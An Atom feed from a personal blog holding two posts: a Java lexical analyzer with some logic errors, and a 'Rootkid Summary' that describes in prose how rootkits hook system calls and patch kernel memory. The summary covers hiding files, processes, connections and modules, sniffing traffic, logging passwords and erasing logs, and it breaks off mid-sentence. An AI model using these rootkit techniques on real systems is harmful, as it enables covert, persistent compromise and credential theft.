<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lu Ruan</title>
  
  <subtitle>A personal bolg for study and notes!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-11-22T10:35:16.300Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Lu Raun</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Realize lexical analyzer with java!</title>
    <link href="http://yoursite.com/2018/11/22/8/"/>
    <id>http://yoursite.com/2018/11/22/8/</id>
    <published>2018-11-22T10:36:36.062Z</published>
    <updated>2018-11-22T10:35:16.300Z</updated>
    
    <content type="html"><![CDATA[<p>definition:<br>Lexical analyzer function input source program, in accordance with the rules of word decomposition into a series of word symbols. A word is the smallest unit of independence in the language, including keywords, identifiers, operators, delimiters, and constants.<br>(1) The keyword is a fixed identifier defined by the program language. For example, the begin, end, if, while of Pascal are reserved words. These words are usually not used as general identifiers.<br>(2) Identifiers are used to represent various names, such as variable names, array names, process names, and so on.<br>(3) constant constant types are generally integer, real type, Boolean, text and so on.<br>(4) Operators such as +, -, *, / and so on.<br>(5) delimiters such as commas, semicolons, brackets, and so on.<br>Output:<br>Lexical analyzer output word symbols are often expressed as the following binary:<br>(Word type, attribute value of word symbol)<br>The word genre is usually encoded in integers. Identifiers are generally classified as one. Constants should be sorted by type (whole, real, boolean, etc.). Keywords can be treated as a whole. Operators can use a method of one character. The boundary character is generally used as a method. For each word symbol, in addition to giving the category code, the attribute information about the word symbol should also be given. The attribute of a word symbol refers to the characteristic or characteristic of a word symbol  </p><h1 id="The-specific-implementation-details"><a href="#The-specific-implementation-details" class="headerlink" title="The specific implementation details"></a>The specific implementation details</h1><hr><h3 id="This-is-my-first-use-Java-to-do-a-big-profram-I-will-insisted-to-write-codes-about-Java"><a href="#This-is-my-first-use-Java-to-do-a-big-profram-I-will-insisted-to-write-codes-about-Java" class="headerlink" title="[This is my first use Java to do a big profram,I will insisted to write codes about Java!"></a>[This is my first use Java to do a big profram,I will insisted to write codes about Java!</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">package com.sun.net.ssl.internal.ssl;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;  </span><br><span class="line"></span><br><span class="line">import java.io.FileNotFoundException;  </span><br><span class="line"></span><br><span class="line">import java.io.FileReader;  </span><br><span class="line"></span><br><span class="line">import java.io.IOException;  </span><br><span class="line"></span><br><span class="line">public class shiyan1 &#123;</span><br><span class="line"></span><br><span class="line">public int zifu;  //扫描字符</span><br><span class="line"></span><br><span class="line">public int zhuangtai;//保留字状态码  </span><br><span class="line"></span><br><span class="line">public String \[\] name=new String\[\]&#123;<span class="string">"关键字"</span>,<span class="string">"标识符"</span>,<span class="string">"常数"</span>,<span class="string">"关系运算符"</span>,<span class="string">"运算符"</span>,<span class="string">"分界符"</span>,<span class="string">"error"</span>&#125;;      </span><br><span class="line"></span><br><span class="line">    public StringBuffer strToken = new StringBuffer();//存放构成单词符号的字符串  </span><br><span class="line"></span><br><span class="line">    public String \[\] retainWord = new String\[\]&#123;<span class="string">"int"</span>,<span class="string">"if"</span>,<span class="string">"else"</span>,<span class="string">"return"</span>,<span class="string">"main"</span>,<span class="string">"void"</span>,<span class="string">"while"</span>,<span class="string">"break"</span>&#125;;//保留字  </span><br><span class="line"></span><br><span class="line">    //判断是否是字母  </span><br><span class="line"></span><br><span class="line">    public boolean <span class="function"><span class="title">IsLetter</span></span>()&#123;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((zifu&gt;=65 &amp;&amp; zifu &lt;= 90) || (zifu &gt;= 97 &amp;&amp; zifu &lt;=122))&#123;  </span><br><span class="line"></span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;  </span><br><span class="line"></span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    //判断是否是数字  </span><br><span class="line"></span><br><span class="line">    public boolean <span class="function"><span class="title">IsDigit</span></span>()&#123;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(zifu&gt;=48 &amp;&amp; zifu &lt;= 57)&#123;  </span><br><span class="line"></span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;  </span><br><span class="line"></span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    //判断是否是空格  </span><br><span class="line"></span><br><span class="line">    public boolean IsBC(int ch)&#123;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ch == 32)&#123;  </span><br><span class="line"></span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;  </span><br><span class="line"></span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    //连接字符  </span><br><span class="line"></span><br><span class="line">    public void Concat(char ch)&#123;  </span><br><span class="line"></span><br><span class="line">        strToken.append(ch);  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    //判断是否是保留字  </span><br><span class="line"></span><br><span class="line">    public int <span class="function"><span class="title">Reserve</span></span>()&#123;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(int i = 0;i &lt; retainWord.length;i++)&#123;  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(strToken.toString().equals(retainWord\[i\]))&#123;  </span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> 1;  </span><br><span class="line"></span><br><span class="line">            &#125;  </span><br><span class="line"></span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strToken.length() != 0)&#123;  </span><br><span class="line"></span><br><span class="line">        //String strTaken;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(int m=0;m&lt;strToken.length();m++)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(int j=1;j&lt;m;j++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strToken.charAt(j)!=<span class="string">'0'</span> || strToken.charAt(j)!=<span class="string">'1'</span> || strToken.charAt(j)!=<span class="string">'2'</span> ||strToken.charAt(j)!=<span class="string">'3'</span> || strToken.charAt(j)!=<span class="string">'4'</span> || strToken.charAt(j)!=<span class="string">'5'</span> || strToken.charAt(j)!=<span class="string">'6'</span> || strToken.charAt(j)!=<span class="string">'7'</span> || strToken.charAt(j)!=<span class="string">'8'</span> || strToken.charAt(j)!=<span class="string">'9'</span> )</span><br><span class="line"></span><br><span class="line">         &#123;<span class="built_in">return</span> 5;</span><br><span class="line"></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strToken.charAt(m)&gt;=<span class="string">'0'</span> &amp;&amp; strToken.charAt(m)&lt;=<span class="string">'9'</span>)&#123;  </span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> 3; </span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">//<span class="keyword">if</span>(strToken.charAt(0)!=IsLetter())</span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">          //<span class="keyword">if</span>()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> 2;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    //  </span><br><span class="line"></span><br><span class="line">    public void <span class="function"><span class="title">Retract</span></span>()&#123;  </span><br><span class="line"></span><br><span class="line">    zhuangtai = Reserve();  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(zhuangtai == 1)&#123;  </span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">"('"</span>+1+<span class="string">"','"</span>+strToken+<span class="string">"','"</span>+name\[0\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zhuangtai == 2)&#123;  </span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">"('"</span>+2+<span class="string">"','"</span>+strToken+<span class="string">"','"</span>+name\[1\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(zhuangtai == 3)&#123;  </span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">"('"</span>+3+<span class="string">"','"</span>+strToken+<span class="string">"','"</span>+name\[2\]+<span class="string">"')"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(zhuangtai == 5)&#123;  </span><br><span class="line"></span><br><span class="line">                    System.out.println(<span class="string">"('"</span>+6+<span class="string">"','"</span>+strToken+<span class="string">"','"</span>+name\[6\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">        strToken.delete(0, strToken.length());  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    /\*\*  </span><br><span class="line"></span><br><span class="line">     \* 读取文件  </span><br><span class="line"></span><br><span class="line">     */  </span><br><span class="line"></span><br><span class="line">    public void <span class="function"><span class="title">scanner</span></span>()&#123;  </span><br><span class="line"></span><br><span class="line">        BufferedReader br;  </span><br><span class="line"></span><br><span class="line">        try &#123;  </span><br><span class="line"></span><br><span class="line">            br = new BufferedReader(new FileReader(<span class="string">"C:/Users/Administrator/Desktop/rootkid/xx.txt"</span>));  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>((zifu = br.read()) != -1)&#123;   </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(IsBC(zifu) == <span class="literal">false</span>)&#123;  </span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(IsLetter())&#123;  </span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(IsLetter() == <span class="literal">true</span> || IsDigit() == <span class="literal">true</span>)&#123;  </span><br><span class="line"></span><br><span class="line">                            Concat((char)zifu);  </span><br><span class="line"></span><br><span class="line">                        &#125;  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(IsDigit() == <span class="literal">true</span>)&#123;  </span><br><span class="line"></span><br><span class="line">                        Concat((char)zifu);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(IsDigit())&#123;  </span><br><span class="line"></span><br><span class="line">                        Concat( (char)zifu);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zifu == 61)&#123;  </span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>((strToken.length() != 0 )&amp;&amp; (strToken.charAt(0) == <span class="string">'='</span>))&#123;  </span><br><span class="line"></span><br><span class="line">                            strToken.append((char)zifu);  </span><br><span class="line"></span><br><span class="line">                            System.out.println(<span class="string">"('"</span>+4+<span class="string">"','"</span>+strToken+<span class="string">"','"</span>+name\[3\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                            strToken.delete(0, strToken.length());  </span><br><span class="line"></span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"></span><br><span class="line">                            strToken.append((char)zifu);  </span><br><span class="line"></span><br><span class="line">                        &#125;  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zifu == 43)&#123;  </span><br><span class="line"></span><br><span class="line">                        Retract();  </span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"('"</span>+4+<span class="string">"','"</span>\+ (char)zifu+<span class="string">"','"</span>+name\[4\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zifu == 45)&#123;  </span><br><span class="line"></span><br><span class="line">                        Retract();  </span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"('"</span>+4+<span class="string">"','"</span>\+ (char)zifu+<span class="string">"','"</span>+name\[4\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zifu == 42)&#123;  </span><br><span class="line"></span><br><span class="line">                        Retract();  </span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"('"</span>+4+<span class="string">"','"</span>\+ (char)zifu+<span class="string">"','"</span>+name\[4\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(zifu == 47)&#123;  </span><br><span class="line"></span><br><span class="line">                        Retract();  </span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"('"</span>+4+<span class="string">"','"</span>\+ (char)zifu+<span class="string">"','"</span>+name\[4\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">';'</span>)&#123;  </span><br><span class="line"></span><br><span class="line">                        Retract();  </span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>\+ (char)zifu+<span class="string">"','"</span>+name\[5\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">'('</span>)&#123;  </span><br><span class="line"></span><br><span class="line">                        Retract();  </span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>\+ (char)zifu+<span class="string">"','"</span>+name\[5\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">')'</span>)&#123;  </span><br><span class="line"></span><br><span class="line">                        Retract();  </span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>\+ (char)zifu+<span class="string">"','"</span>+name\[5\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">'&#123;'</span>)&#123;  </span><br><span class="line"></span><br><span class="line">                        Retract();  </span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>\+ (char)zifu+<span class="string">"','"</span>+name\[5\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">'&#125;'</span>)&#123;  </span><br><span class="line"></span><br><span class="line">                        Retract();  </span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>\+ (char)zifu+<span class="string">"','"</span>+name\[5\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((char) zifu == <span class="string">','</span>)&#123;  </span><br><span class="line"></span><br><span class="line">                        Retract();  </span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">"('"</span>+5+<span class="string">"','"</span>\+ (char)zifu+<span class="string">"','"</span>+name\[5\]+<span class="string">"')"</span>);  </span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    //<span class="keyword">else</span> <span class="keyword">if</span>(zifu)&#123;&#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"></span><br><span class="line">                    Retract();  </span><br><span class="line"></span><br><span class="line">                &#125;  </span><br><span class="line"></span><br><span class="line">            &#125;  </span><br><span class="line"></span><br><span class="line">        &#125; catch (FileNotFoundException e1) &#123;  </span><br><span class="line"></span><br><span class="line">            // TODO Auto-generated scatch block  </span><br><span class="line"></span><br><span class="line">            e1.printStackTrace();  </span><br><span class="line"></span><br><span class="line">        &#125; catch (IOException e) &#123;  </span><br><span class="line"></span><br><span class="line">            // TODO Auto-generated catch block  </span><br><span class="line"></span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"></span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    public static void main(String\[\] args) &#123;  </span><br><span class="line"></span><br><span class="line">        shiyan1 compile2 = new shiyan1();  </span><br><span class="line"></span><br><span class="line">        compile2.scanner();  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;definition:&lt;br&gt;Lexical analyzer function input source program, in accordance with the rules of word decomposition into a series of word s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/11/22/6/"/>
    <id>http://yoursite.com/2018/11/22/6/</id>
    <published>2018-11-22T10:36:36.054Z</published>
    <updated>2018-11-22T10:26:53.760Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Rootkid-Summary"><a href="#Rootkid-Summary" class="headerlink" title="Rootkid Summary"></a>Rootkid Summary</h2><h2 id="title-Rootkid-Summary"><a href="#title-Rootkid-Summary" class="headerlink" title="title: Rootkid Summary"></a>title: Rootkid Summary</h2><p>Intermittent learning process do not understand slowly learn a lot, although for Rootkid it is only worth mentioning the fur content but for me still do not know progress, after all, many things can not be achieved overnight, Only after stepping on a variety of pit you will slowly comprehend some things, and later summed up some truth (only for me), learning is a gradual process, can not be the slightest irritability, if you are anxious, then You have lost from the beginning, you just started learning the process, will certainly run into a wall, which is beyond doubt, and you need to do is ask more experienced seniors or teachers, which will make you less Take a lot of detours!  </p><h2 id="For-example"><a href="#For-example" class="headerlink" title="#For example"></a>#For example</h2><h3 id="Rootkit’s-main-categories"><a href="#Rootkit’s-main-categories" class="headerlink" title="Rootkit’s main categories:"></a>Rootkit’s main categories:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Application level -&gt; Kernel level -&gt; Hardware level</span><br><span class="line"></span><br><span class="line">Early rootkit mainly <span class="keyword">for</span> the application-level rootkit, application-level rootkit mainly by replacing the login, ps, ls, netstat and other system tools, or modify. Rhosts and other system configuration files to achieve hidden and backdoor; hardware rootkit mainly refers to bios rootkit, Before the system gets control, by writing to the disk file, and <span class="keyword">then</span> by the bootloader to load the file to regain control, you can also use the virtual machine technology, so that the entire operating system running <span class="keyword">in</span> the rootkit grasp; the most common rootkit Is kernel-level rootkit.</span><br><span class="line"></span><br><span class="line">Kernel-level rootkit can be divided into lkm rootkit, non-lkm rootkit. lkm rootkit is based on lkm technology, through the interface provided by the system to load into the kernel space, as part of the kernel, and <span class="keyword">then</span> through the hook system calls and other technologies to achieve hidden, backdoor <span class="keyword">function</span>. Non-lkm rootkit mainly refers to the system does not support the lkm mechanism to modify the kernel of a method, mainly through / dev / mem, / dev / kmem equipment directly to the memory, so that the kernel to modify.</span><br><span class="line"></span><br><span class="line">Non-lkm rootkit To achieve the kernel changes, the first need to get kernel space memory, it is necessary to call kmalloc allocation of memory, and kmalloc is the kernel space call, can not directly call the user space <span class="keyword">in</span> the <span class="keyword">function</span>, so think of the call through int 0x80 Function of the method. First select an unusual system call number, find the item <span class="keyword">in</span> sys\_call\_table, by writing / dev / mem directly modify it to kmalloc <span class="keyword">function</span> address, so that when we call the user space <span class="keyword">in</span> the user space, you can int 0x80 Into the kernel space, the implementation of kmalloc <span class="keyword">function</span> to allocate memory, and the allocation of the memory address from the eax register to <span class="built_in">return</span>, so we get a kernel address space memory, and <span class="keyword">then</span> the <span class="keyword">function</span> will be written to the memory hack, and again modify the system call table , You can achieve hook <span class="keyword">function</span> call <span class="keyword">function</span></span><br></pre></td></tr></table></figure><h3 id="Common-features-of-rootkit"><a href="#Common-features-of-rootkit" class="headerlink" title="Common features of rootkit:"></a>Common features of rootkit:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Hidden files: through strace ls can be found ls <span class="built_in">command</span> is through sys\_getdents64 get the file directory, so you can modify the sys\_getdents64 system call or the bottom of the readdir to achieve hidden files and directories, as well as ext2 file system directly to modify the method, but It is not easy to implement, there are some specific restrictions.</span><br><span class="line"></span><br><span class="line">Hidden process: hidden process and hidden files similar to the ps <span class="built_in">command</span> is to <span class="built_in">read</span> / proc file system under the process directory to obtain process information, as long as you can hide the / proc file system under the process directory can achieve the effect of hidden process, Ie hook sys_getdents64 and readdir.</span><br><span class="line"></span><br><span class="line">Hide the connection: netstat <span class="built_in">command</span> is by reading / proc file system under the net / tcp and net / udp file to obtain the current connection information, so you can hook sys\_read call to achieve a hidden connection, you can modify tcp4\_seq\_show and udp4\_seq_show and other <span class="built_in">functions</span>.</span><br><span class="line"></span><br><span class="line">Hide the module: lsmod <span class="built_in">command</span> is mainly through the sys\_query\_module system call to obtain the module information, you can call the hook sys\_query\_module system to hide the module, you can also remove the module from the kernel module list to achieve the hidden effect.</span><br><span class="line"></span><br><span class="line">Sniffer: sniffer can directly access library libpcap link layer, intercepted data packets, packets may be intercepted at the point of hook by the IP layer of linux netfilter framework. Sniffer to obtain other data packets on the network need to <span class="built_in">set</span> the network card to the promiscuous mode, <span class="built_in">which</span> is through the ioctl system call SIOCSIFFLAGS order to see the current mode of the network card is through the SIOCGIFFLAGS order, so you can hide the network through the hook sys_ioctl mixed mode.</span><br><span class="line"></span><br><span class="line">Record password: password records can be achieved by hook sys_read call system, such as through a process to determine the name of the currently running the current terminal is closed or <span class="built_in">echo</span>, the user can obtain the password. hook sys_read can also implement other <span class="built_in">functions</span> such as login back door.</span><br><span class="line"></span><br><span class="line">Erase <span class="built_in">log</span>: <span class="built_in">log</span> traditional unix predominantly at / var / <span class="built_in">log</span> / messages, / var / <span class="built_in">log</span> / lastlog, / var / run / utmp, / var / <span class="built_in">log</span> / wtmp, can be prepared by appropriate modification tool <span class="built_in">log</span> file , You can also change the environment such as HISTFILE / 